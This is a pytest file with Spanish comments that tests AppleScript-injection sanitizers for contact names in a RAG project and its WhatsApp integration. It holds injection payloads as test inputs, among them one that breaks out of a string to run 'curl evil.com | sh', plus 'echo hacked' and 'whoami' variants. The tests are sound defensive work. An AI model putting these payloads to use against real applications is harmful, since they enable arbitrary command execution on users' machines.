"""Tests para el guard de AppleScript injection.

Valida que _sanitize_applescript_string (rag/__init__.py) y
_wa_sanitize_applescript_string (rag/integrations/whatsapp.py) rechazan
payloads de inyección y aceptan nombres legítimos Unicode.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import rag as _rag
from rag.integrations import whatsapp as _wa


# ── _sanitize_applescript_string (rag/__init__.py) ────────────────────────────

def test_sanitize_accepts_plain_name():
    assert _rag._sanitize_applescript_string("Juan") == "Juan"


def test_sanitize_accepts_unicode_latin():
    """Nombres con acentos, ñ, diéresis — frecuentes en contactos rioplatenses."""
    assert _rag._sanitize_applescript_string("María José") is not None
    assert _rag._sanitize_applescript_string("José") is not None
    assert _rag._sanitize_applescript_string("Ñoño") is not None
    assert _rag._sanitize_applescript_string("François") is not None


def test_sanitize_accepts_common_name_punctuation():
    """Apóstrofe, guión, punto — válidos en nombres propios."""
    assert _rag._sanitize_applescript_string("O'Brien") is not None
    assert _rag._sanitize_applescript_string("Jean-Pierre") is not None


def test_sanitize_rejects_shell_injection_payload():
    """Payload clásico: cierra el string + llama do shell script."""
    payload = 'Juan" & (do shell script "curl evil.com | sh") & "'
    assert _rag._sanitize_applescript_string(payload) is None


def test_sanitize_rejects_newline_injection():
    """\\n cierra el string AppleScript y permite nueva sentencia."""
    assert _rag._sanitize_applescript_string("Juan\ndo shell script") is None


def test_sanitize_rejects_carriage_return():
    assert _rag._sanitize_applescript_string("Juan\rEvil") is None


def test_sanitize_rejects_backtick():
    """Backquote puede usarse para command substitution en algunos contextos."""
    assert _rag._sanitize_applescript_string("Juan`whoami`") is None


def test_sanitize_rejects_parenthesis():
    """Paréntesis son metacaracteres en AppleScript para llamadas de función."""
    assert _rag._sanitize_applescript_string("Juan(evil)") is None


def test_sanitize_rejects_semicolon():
    """Punto y coma separa sentencias en muchos lenguajes."""
    assert _rag._sanitize_applescript_string("Juan; evil") is None


def test_sanitize_rejects_ampersand():
    """& es el operador de concatenación en AppleScript — permite inyectar código."""
    assert _rag._sanitize_applescript_string('Juan" & evil & "') is None


def test_sanitize_empty_string_returns_empty():
    assert _rag._sanitize_applescript_string("") == ""


def test_sanitize_escapes_double_quote():
    """Si el nombre contiene comilla (aunque debería fallar allowlist), el
    escaping la maneja correctamente."""
    # Comilla doble sola no pasa el allowlist
    result = _rag._sanitize_applescript_string('María"')
    assert result is None


def test_sanitize_escapes_backslash():
    """Backslash en el nombre → debe quedar double-escaped."""
    # Backslash no pasa el allowlist porque no está en \w ni en la lista explícita
    result = _rag._sanitize_applescript_string("Juan\\Evil")
    assert result is None


def test_sanitize_too_long_rejected():
    """Strings > 200 chars son rechazados por el allowlist (denial-of-service)."""
    long_name = "A" * 201
    assert _rag._sanitize_applescript_string(long_name) is None


def test_sanitize_exactly_200_chars_accepted():
    """200 chars es el límite — debe aceptarse."""
    name = "A" * 200
    assert _rag._sanitize_applescript_string(name) is not None


# ── _wa_sanitize_applescript_string (rag/integrations/whatsapp.py) ────────────

def test_wa_sanitize_accepts_valid_name():
    assert _wa._wa_sanitize_applescript_string("María") is not None


def test_wa_sanitize_rejects_injection_payload():
    payload = 'Juan" & (do shell script "echo hacked") & "'
    assert _wa._wa_sanitize_applescript_string(payload) is None


def test_wa_sanitize_rejects_newline():
    assert _wa._wa_sanitize_applescript_string("Juan\nEvil") is None


def test_wa_sanitize_empty():
    assert _wa._wa_sanitize_applescript_string("") == ""


def test_wa_sanitize_jose_accepted():
    """José con acento — nombre muy común en AR, no debe bloquearse."""
    result = _wa._wa_sanitize_applescript_string("José")
    assert result is not None
    assert "José" in result


# ── _exact_contact_lookup rechaza payload ────────────────────────────────────

def test_exact_contact_lookup_rejects_injection(monkeypatch):
    """_exact_contact_lookup con payload de inyección → None sin llamar osascript."""
    import subprocess
    calls = []
    monkeypatch.setattr(subprocess, "run", lambda *a, **kw: calls.append(a) or None)

    payload = 'Juan" & (do shell script "echo hacked") & "'
    result = _wa._exact_contact_lookup(payload)
    assert result is None
    assert len(calls) == 0, "osascript NO debe llamarse con payload de inyección"


def test_exact_contact_lookup_allows_valid_name(monkeypatch):
    """_exact_contact_lookup con nombre válido → intenta la llamada a osascript."""
    import subprocess
    calls = []

    class FakeProc:
        returncode = 1  # no match, pero intentó
        stdout = ""

    monkeypatch.setattr(subprocess, "run", lambda *a, **kw: calls.append(a) or FakeProc())

    result = _wa._exact_contact_lookup("María")
    # returncode=1 → None (no match), pero osascript SÍ fue invocado
    assert result is None
    assert len(calls) >= 1, "osascript debe llamarse con nombre válido"
